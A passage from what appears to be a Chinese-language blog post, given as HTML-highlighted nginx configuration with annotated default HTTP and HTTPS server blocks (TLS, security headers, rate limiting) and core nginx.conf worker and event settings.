style=\"color:#f92672\"\u003elisten\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e80\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003edefault_server\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## server_name name ...; 設定虛擬主機名，可使用正則表示式，預設為 \u0026#34;\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003eserver_name\u003c/span\u003e  \u003cspan style=\"color:#e6db74\"\u003e_\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eaccess_log\u003c/span\u003e  \u003cspan style=\"color:#e6db74\"\u003elogs/default/default.log\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ejson\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eerror_log\u003c/span\u003e   \u003cspan style=\"color:#e6db74\"\u003elogs/default/default.error.log\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ewarn\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## module: ngx_http_access_module\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#75715e\"\u003e## allow address | CIDR | unix: | all; 允許 IP 訪問\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003eallow\u003c/span\u003e 1.1.1.1;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## deny address | CIDR | unix: | all; 禁止 IP 訪問\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003edeny\u003c/span\u003e 12.34.56.78;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## 設定請求訪問的根資料夾\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003eroot\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/usr/share/nginx/html\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## limit_req zone=name [burst=number] [nodelay | delay=number]; 設定限制請求的規則 zone\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003elimit_req\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ezone=websocket\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003enodelay\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## limit_req_log_level info | notice | warn | error; 設定被拒絕連線的請求日誌等級，預設為 error\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003elimit_req_log_level\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ewarn\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## location [ = | ~ | ~* | ^~ ] uri { ... }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#75715e\"\u003e## location @name { ... } 依據請求的 URI 配置\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003elocation\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003edefault_type\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eapplication/json\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e## 返回 HTTP 狀態碼 200，並包含字串\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e        \u003cspan style=\"color:#f92672\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e200\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e{\u003cspan style=\"color:#f92672\"\u003e\u0026#34;Code\u0026#34;:\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$status\u0026#34;, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;IP\u0026#34;:\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$remote_addr\u0026#34;}\u0026#39;;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eserver\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## 下方設定為監聽 443 port，且為預設的虛擬主機，所有連線都使用 SSL\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003elisten\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e443\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003edefault_server\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003essl\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eserver_name\u003c/span\u003e  \u003cspan style=\"color:#e6db74\"\u003e_\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eaccess_log\u003c/span\u003e  \u003cspan style=\"color:#e6db74\"\u003elogs/default/default.log\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ejson\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eerror_log\u003c/span\u003e   \u003cspan style=\"color:#e6db74\"\u003elogs/default/default.error.log\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ewarn\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## module: ngx_http_ssl_module\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#75715e\"\u003e## 設定 PEM 格式的證書\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003essl_certificate\u003c/span\u003e     \u003cspan style=\"color:#e6db74\"\u003e/etc/ssl/hddv1.com.crt\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## 設定 PEM 格式的密鑰\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003essl_certificate_key\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/etc/ssl/hddv1.com.key\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## 設定 SSL 版本，預設為 TLSv1 TLSv1.1 TLSv1.2\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003essl_protocols\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eTLSv1.2\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eTLSv1.3\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## 設定啟用的加密方法，預設為 HIGH:!aNULL:!MD5\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003essl_ciphers\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;EECDH+ECDSA+AESGCM:EECDH+aRSA+AESGCM:EECDH+ECDSA+SHA384:EECDH+ECDSA+SHA256:EECDH+aRSA+SHA384:EECDH+aRSA+SHA256:EECDH+aRSA+RC4:EECDH:EDH+aRSA:HIGH:!RC2:!RC4:!aNULL:!eNULL:!LOW:!IDEA:!DES:!TDES:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS:!EXPORT:!ANON\u0026#34;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## 為 DHE 加密法指定帶有 DH 參數的文件\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003essl_dhparam\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/etc/ssl/dhparams.pem\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## 是否優先使用 server 的加密法，預設為 off\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003essl_prefer_server_ciphers\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eon\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## ssl_session_cache off | none | [builtin[:size]] [shared:name:size];\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#75715e\"\u003e## 設定緩存及大小，預設為 none\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003essl_session_cache\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eshared:SSL:1m\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## 設定 session 可重複使用的時間，預設為 5 分鐘\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003essl_session_timeout\u003c/span\u003e  \u003cspan style=\"color:#ae81ff\"\u003e5m\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eadd_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eX-Frame-Options\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;SAMEORIGIN\u0026#34;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eadd_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eX-XSS-Protection\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;1\u003c/span\u003e; \u003cspan style=\"color:#f92672\"\u003emode=block\u0026#34;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eadd_header\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eStrict-Transport-Security\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;max-age=31536000\u003c/span\u003e; \u003cspan style=\"color:#f92672\"\u003eincludeSubdomains\u003c/span\u003e; \u003cspan style=\"color:#f92672\"\u003epreload\u0026#34;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eroot\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/usr/share/nginx/html\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003elimit_req\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ezone=websocket\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003enodelay\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003elimit_req_log_level\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ewarn\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003edefault_type\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eapplication/json\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003elocation\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003edefault_type\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eapplication/json\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e200\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e{\u003cspan style=\"color:#f92672\"\u003e\u0026#34;Code\u0026#34;:\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$status\u0026#34;, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;IP\u0026#34;:\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$remote_addr\u0026#34;}\u0026#39;;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"nginxconf\"\u003enginx.conf\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## module: ngx_core_module\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## worker_processes number | auto; 啟動 Nginx worker 程序數量, 設定 auto 即和 CPU 的數量相等\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eworker_processes\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eauto\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## worker_rlimit_nofile number; Nginx worker 程序最大打開文件數，預設為系統 RLIMIT_NOFILE\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eworker_rlimit_nofile\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e131072\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## worker_shutdown_timeout time; 設定關閉超時時間，當執行 reload 或是其他相關指令，超過 time 時間之後，Nginx 會主動關閉所有受影響的 worker\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eworker_shutdown_timeout\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e60\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## error_log file [level]; 設定錯誤日誌寫入位置\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## debug, info, notice, warn, error, crit, alert, emerg\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eerror_log\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003elogs/error.log\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ewarn\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## pid file; 主程序 ID 文件位置\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003epid\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003elogs/nginx.pid\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## module: ngx_core_module\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## 設定連線處理相關\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eevents\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## worker_connections number; 單個 Nginx worker 程序的最大並發連接數，預設為 512，需要小於 worker_rlimit_nofile\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#75715e\"\u003e## 最大連接數 = worker_connections * worker_processes\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003eworker_connections\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e102400\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## accept_mutex on | off; 預設為 off\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#75715e\"\u003e## 只有一個新連線進入，如果設定為 on，只有一個 worker 會接受連線，其餘持續休眠\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#75715e\"\u003e## 如果設定為 off，所有 worker 會被喚醒，只有一個 worker 會接受連線，其餘重新休眠\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#75715e\"\u003e## 業務上使用 TCP 長連線、流量大，off 的效能以及 QPS 表現較佳\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003eaccept_mutex\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eoff\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## multi_accept on | off; 是否同時接受所有的請求，預設為 off\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003emulti_accept\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eon\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## module: ngx_http_core_module\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## 設定 HTTP server 相關\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003ehttp\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## module: ngx_core_module\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#75715e\"\u003e## include file | mask; 使用文件中的設定\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#75715e\"\u003e## 下方為設定 MIME 類型,類型由 mime.type 文件定義\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003einclude\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003emime.types\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## default_type mime-type; 定義默認 MIME 類型，預設為 text/plain\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003edefault_type\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eapplication/octet-stream\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## server_names_hash_max_size size; 設定 server_name 的 hash 表最大值，預設為 512 kb\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003eserver_names_hash_max_size\u003c/span\u003e \u003cspan 